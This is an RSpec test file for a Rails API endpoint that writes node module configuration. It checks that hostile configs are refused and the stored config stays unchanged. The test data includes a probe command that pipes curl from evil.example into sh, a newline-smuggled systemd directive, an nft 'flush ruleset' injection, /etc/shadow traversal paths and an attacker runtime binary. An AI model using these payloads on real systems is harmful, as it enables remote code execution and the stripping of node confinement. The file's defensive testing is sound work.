# frozen_string_literal: true

require "rails_helper"

# IMP-7d4c691ffe91 — `PATCH /api/v1/system/node_modules/:id` permits
# `config: {}` wholesale at arbitrary depth. NodeModule#config is serialized
# VERBATIM to every node carrying the module
# (System::NodeModuleNodeApiSerializer#serialize_module_full) and consumed
# on-node by the agent's probe runner, so an unvalidated write here is a path
# for putting agent-consumed data on fleet nodes. The write never passed
# through System::ManifestImportService, so every semantic rule the importer
# enforces on the config-borne blocks (`verify:`, `restart_after_update:`) was
# bypassed.
#
# ORACLE NOTE: the load-bearing assertion in every rejection example is that
# the STORED config is UNCHANGED — a 4xx assertion alone passes cleanly against
# code that writes the row and then reports 4xx. The status assertion is
# secondary and lives in its own example.
RSpec.describe "Api::V1::System::NodeModules config validation", type: :request do
  let(:account)  { create(:account) }
  let(:platform) { create(:system_node_platform, account: account) }
  let(:category) { create(:system_node_module_category, account: account) }

  let(:update_user) { user_with_permissions("system.modules.update", account: account) }
  let(:create_user) { user_with_permissions("system.modules.create", account: account) }

  # The known-good seed every rejection example compares against. All blocks
  # are shapes ManifestImportService accepts today.
  let(:seeded_config) do
    {
      "verify" => {
        "probes" => [
          { "name" => "gh", "command" => "gh", "resolves_to" => "/usr/bin/gh" }
        ]
      },
      "restart_after_update" => [
        { "module" => "powernode-hub-backend", "services" => [ "rails" ] }
      ],
      # The confinement policy the agent's buildPolicy consumes — the block
      # the downgrade-by-omission examples below defend.
      "security" => {
        "capabilities" => [ "CAP_NET_BIND_SERVICE" ],
        "egress_allow" => [ "api.anthropic.com" ],
        "privileged" => false,
        "user_namespace" => true
      },
      # A key with no validator — carried through untouched, proving the gate
      # is a shape check on the semantic blocks and not a key allowlist.
      "module_promotion_required_count" => 2
    }
  end

  let!(:node_module) do
    create(:system_node_module, account: account, node_platform: platform,
                                category: category, config: seeded_config)
  end

  def patch_config(config, user: update_user)
    patch "/api/v1/system/node_modules/#{node_module.id}",
          params: { node_module: { config: config } }.to_json,
          headers: auth_headers_for(user).merge("Content-Type" => "application/json")
  end

  # Each hostile payload is one the importer already refuses. If any of these
  # starts being accepted, the two paths have drifted apart again.
  {
    "a verify probe whose command is a shell-injection string" => {
      "verify" => { "probes" => [
        { "name" => "gh", "command" => "gh; curl http://evil.example/x | sh",
          "resolves_to" => "/usr/bin/gh" }
      ] }
    },
    "a verify probe whose command is an absolute path (cannot see a shadow)" => {
      "verify" => { "probes" => [
        { "name" => "gh", "command" => "/usr/local/bin/gh", "resolves_to" => "/usr/bin/gh" }
      ] }
    },
    "a verify probe with no resolves_to (an existence check)" => {
      "verify" => { "probes" => [ { "name" => "gh", "command" => "gh" } ] }
    },
    "a verify probe with a non-canonical resolves_to" => {
      "verify" => { "probes" => [
        { "name" => "gh", "command" => "gh", "resolves_to" => "/usr/bin/../../etc/shadow" }
      ] }
    },
    "a verify block that declares no probe at all" => {
      "verify" => { "probes" => [] }
    },
    "a verify block smuggling an unrecognized key" => {
      "verify" => { "probes" => [
                      { "name" => "gh", "command" => "gh", "resolves_to" => "/usr/bin/gh" }
                    ],
                    "shells" => [ "sh" ] }
    },
    "a restart_after_update entry using the silent `service:` typo" => {
      "restart_after_update" => [ { "module" => "powernode-hub-backend", "service" => "rails" } ]
    },
    "a restart_after_update entry with no target module" => {
      "restart_after_update" => [ { "services" => [ "rails" ] } ]
    },
    # Reachable ONLY through this endpoint — a manifest cannot set a promotion
    # threshold at config top level. PromotionCriteria calls #to_i on the value
    # and the promotion sensor rescues per SENSOR, so one poisoned module would
    # stop promotion sensing for the entire account.
    "a promotion threshold whose value is not a number" => {
      "module_promotion_dwell_minutes" => { "minutes" => 5 }
    },
    "a promotion threshold whose value is a boolean" => {
      "module_promotion_required_count" => true
    }
  }.each do |label, hostile|
    it "leaves the stored config UNCHANGED when the payload carries #{label}" do
      # Merged over the full seeded config so the hostile block is the ONLY
      # cause of refusal — a bare hostile payload would also trip the
      # downgrade-by-omission gate (it omits security/verify), which would
      # mask a broken block validator from mutation testing.
      patch_config(seeded_config.merge(hostile))
      expect(node_module.reload.config).to eq(seeded_config)
    end
  end

  # security: — the confinement policy the agent turns into a systemd
  # sandbox (buildPolicy). Each is refused by the SECURITY-BLOCK CONTRACT
  # grammar; the oracle is again the unchanged stored config.
  {
    "a security block that is not a hash" => "privileged",
    "a security block with an unrecognized key (typo squats a confinement key)" => {
      "capabilties" => [ "CAP_SYS_ADMIN" ]
    },
    "a capability entry smuggling a systemd directive" => {
      "capabilities" => [ "CAP_SYS_ADMIN\nUser=root" ]
    },
    "a capability entry outside the CAP_ grammar" => {
      "capabilities" => [ "cap_sys_admin" ]
    },
    "capabilities as a bare string" => { "capabilities" => "CAP_SYS_ADMIN" },
    "a privileged flag that is a string, which the agent would silently ignore" => {
      "privileged" => "true"
    },
    "a user_namespace flag that is a string, which the agent would silently ignore" => {
      "user_namespace" => "false"
    },
    "a seccomp_profile that is a path (never a name)" => {
      "seccomp_profile" => "/mods/evil/deny"
    },
    "an apparmor_profile smuggling a newline into the drop-in" => {
      "apparmor_profile" => "ok\nSystemCallFilter="
    },
    "a selinux_profile with a traversal segment" => {
      "selinux_profile" => "../shadow"
    },
    "an egress entry smuggling an nft command" => {
      "egress_allow" => [ "10.0.0.1; flush ruleset" ]
    },
    "an egress entry with whitespace" => {
      "egress_allow" => [ "evil.example accept" ]
    },
    "an egress entry with an out-of-range port" => {
      "egress_allow" => [ "host.example:99999" ]
    },
    "an egress entry with an interface-local IPv6 zone-id" => {
      "egress_allow" => [ "fe80::1%eth0" ]
    },
    "an egress CIDR in netmask form (wildcard synonym dodging the documented spelling)" => {
      "egress_allow" => [ "0.0.0.0/0.0.0.0" ]
    },
    "egress_allow as a bare string" => { "egress_allow" => "0.0.0.0/0" }
  }.each do |label, hostile_security|
    it "leaves the stored config UNCHANGED when security carries #{label}" do
      patch_config(seeded_config.merge("security" => hostile_security))
      expect(node_module.reload.config).to eq(seeded_config)
    end
  end

  it "accepts a security block in the shipped-manifest shape (grammar gate, not a policy gate)" do
    replacement = seeded_config.merge(
      "security" => {
        "capabilities" => [ "CAP_CHOWN", "CAP_SETUID" ],
        "egress_allow" => [ "github.com", "api.github.com:443", "10.0.0.0/8", "0.0.0.0/0" ],
        "privileged" => true, # declarable — the approval gate is apply-side (G2)
        "user_namespace" => false,
        "seccomp_profile" => "baseline-deny"
      }
    )
    patch_config(replacement)
    expect(response).to have_http_status(:ok)
    expect(node_module.reload.config).to eq(replacement)
  end

  # daemon_overrides: — key allowlist (IMP-01a02f5a6a1f). The write-time
  # refusal is the loud half; DockerDaemonOverridesResolver's resolve-time
  # filter (its own spec) is the belt-and-braces half for pre-gate rows.
  {
    "runtimes (arbitrary root-executed binary)" => {
      "runtimes" => { "evil" => { "path" => "/persist/evil" } }
    },
    "authorization-plugins (delegates daemon authz)" => {
      "authorization-plugins" => [ "attacker-plugin" ]
    },
    "tlscacert (platform-owned mTLS material)" => {
      "tlscacert" => "/tmp/attacker-ca.pem"
    },
    "a key outside the documented allowlist" => {
      "some-future-dockerd-key" => true
    },
    "a data-root outside the documented storage roots (host-integrity primitive)" => {
      "data-root" => "/etc/docker-root"
    },
    "a data-root with a traversal segment" => {
      "data-root" => "/var/lib/../../etc"
    },
    "a storage-opts entry smuggling whitespace" => {
      "storage-opts" => [ "dm.directlvm_device=/dev/sda --evil" ]
    },
    "a non-hash value" => [ "insecure-registries" ]
  }.each do |label, overrides|
    it "leaves the stored config UNCHANGED when daemon_overrides carries #{label}" do
      patch_config(seeded_config.merge("daemon_overrides" => overrides))
      expect(node_module.reload.config).to eq(seeded_config)
    end
  end

  it "accepts daemon_overrides made of documented allowlisted keys" do
    replacement = seeded_config.merge(
      "daemon_overrides" => {
        "registry-mirrors" => [ "https://mirror.internal:5000" ],
        "insecure-registries" => [ "registry.lan:5000" ],
        "log-driver" => "journald",
        "data-root" => "/persist/docker",
        "storage-opts" => [ "dm.directlvm_device=/dev/vdb" ]
      }
    )
    patch_config(replacement)
    expect(response).to have_http_status(:ok)
    expect(node_module.reload.config).to eq(replacement)
  end

  # Downgrade-by-omission (IMP-01a02f59f44d): this endpoint replaces config
  # WHOLESALE, so a shape-valid payload that simply omits `security` used to
  # strip the module's on-node confinement fleet-wide with a 200. Removal now
  # requires the key's explicit presence — a partial payload cannot say a
  # key's name by accident, so it cannot ack by accident.
  describe "downgrade by omission" do
    it "refuses a config write that OMITS security while the module carries one (stored config unchanged)" do
      patch_config(seeded_config.except("security"))
      expect(node_module.reload.config).to eq(seeded_config)
    end

    it "names the omitted key and the explicit-removal form in the refusal" do
      patch_config(seeded_config.except("security"))
      expect(response).to have_http_status(:unprocessable_content)
      expect(json_response["details"]["validation_errors"].join(" "))
        .to include('omits "security"').and include("null")
    end

    it "refuses a config write that OMITS verify while the module carries one" do
      patch_config(seeded_config.except("verify"))
      expect(node_module.reload.config).to eq(seeded_config)
    end

    it "accepts explicit removal via \"security\": null" do
      replacement = seeded_config.merge("security" => nil)
      patch_config(replacement)
      expect(response).to have_http_status(:ok)
      expect(node_module.reload.config["security"]).to be_nil
    end

    it "accepts explicit removal via \"security\": {} (the on-node default policy)" do
      replacement = seeded_config.merge("security" => {})
      patch_config(replacement)
      expect(response).to have_http_status(:ok)
      expect(node_module.reload.config["security"]).to eq({})
    end

    it "accepts explicit removal of verify via \"verify\": null" do
      replacement = seeded_config.merge("verify" => nil)
      patch_config(replacement)
      expect(response).to have_http_status(:ok)
      expect(node_module.reload.config["verify"]).to be_nil
    end

    it "does not demand re-acknowledgement once the block is gone" do
      patch_config(seeded_config.merge("security" => nil))
      expect(response).to have_http_status(:ok)
      # Second write omits the key entirely — previous value is nil, so
      # nothing meaningful is being dropped and the write goes through.
      followup = seeded_config.except("security")
      patch_config(followup)
      expect(response).to have_http_status(:ok)
      expect(node_module.reload.config).to eq(followup)
    end

    it "leaves config untouched when the payload carries no config key at all" do
      patch "/api/v1/system/node_modules/#{node_module.id}",
            params: { node_module: { description: "just-a-description" } }.to_json,
            headers: auth_headers_for(update_user).merge("Content-Type" => "application/json")
      expect(response).to have_http_status(:ok)
      expect(node_module.reload.config).to eq(seeded_config)
    end
  end

  # strong_params drops a non-hash under `config: {}` (permit_hash returns nil
  # unless the value is Parameters), so this is a regression guard on THAT, not
  # a demonstration that errors_for ran — the response is 200 with the value
  # discarded. It is here because the controller narrows its #to_h to
  # ActionController::Parameters precisely so a shape that DID get through
  # reaches errors_for instead of raising in Array#to_h.
  it "leaves the stored config UNCHANGED when config arrives as a non-hash" do
    patch_config([ { "verify" => { "probes" => [] } } ])
    expect(node_module.reload.config).to eq(seeded_config)
  end

  it "reports 422 with the importer's own error text (secondary to the unchanged-config oracle)" do
    patch_config({ "verify" => { "probes" => [ { "name" => "gh", "command" => "gh" } ] } })
    expect(response).to have_http_status(:unprocessable_content)
    errors = json_response["details"]["validation_errors"]
    expect(errors.join(" ")).to include("resolves_to is required")
  end

  it "rejects a hostile config even when the same request carries an innocuous field" do
    patch "/api/v1/system/node_modules/#{node_module.id}",
          params: { node_module: { description: "should-not-land",
                                   config: { "verify" => { "probes" => [ { "name" => "gh", "command" => "gh" } ] } } } }.to_json,
          headers: auth_headers_for(update_user).merge("Content-Type" => "application/json")
    node_module.reload
    expect(node_module.config).to eq(seeded_config)
    expect(node_module.description).not_to eq("should-not-land")
  end

  it "still accepts a config the importer would accept" do
    replacement = {
      "verify" => { "probes" => [
        { "name" => "gitleaks", "command" => "gitleaks", "resolves_to" => "/usr/bin/gitleaks" }
      ] },
      "restart_after_update" => [ { "module" => "powernode-hub-worker", "services" => [ "sidekiq", "worker-web" ] } ],
      # The seeded config carries security, so its removal must be stated
      # explicitly (REMOVAL CONTRACT) — silence is no longer a valid drop.
      "security" => nil
    }
    patch_config(replacement)
    expect(response).to have_http_status(:ok)
    expect(node_module.reload.config).to eq(replacement)
  end

  # Keys with no semantic consumer-side validator stay writable: `config` is a
  # shared bag whose promotion thresholds / daemon_overrides / manifest_extras
  # entries are documented as operator-editable. The gate must not be a
  # top-level key allowlist.
  it "still accepts config keys that carry no validated semantics" do
    replacement = { "module_promotion_dwell_minutes" => 5,
                    # a numeric STRING is what SiteSetting/account-settings
                    # hand back, so it must stay acceptable here too
                    "module_promotion_required_count" => "2",
                    "manifest_extras" => { "anything" => { "nested" => true } },
                    # explicit removals: the seeded config carries both, and
                    # dropping them by omission is refused (REMOVAL CONTRACT)
                    "security" => nil,
                    "verify" => nil }
    patch_config(replacement)
    expect(response).to have_http_status(:ok)
    expect(node_module.reload.config).to eq(replacement)
  end

  # The create path permits the same `config: {}` — gating only update would
  # leave "create it hostile, never update it" as a one-hop bypass.
  describe "POST /api/v1/system/node_modules" do
    it "creates no row when the config is one the importer would refuse" do
      expect {
        post "/api/v1/system/node_modules",
             params: { node_module: { name: "cfg-gate-#{SecureRandom.hex(3)}",
                                      node_platform_id: platform.id, category_id: category.id,
                                      variety: "config",
                                      config: { "verify" => { "probes" => [ { "name" => "gh", "command" => "gh" } ] } } } }.to_json,
             headers: auth_headers_for(create_user).merge("Content-Type" => "application/json")
      }.not_to change { ::System::NodeModule.where(account: account).count }
    end
  end
end
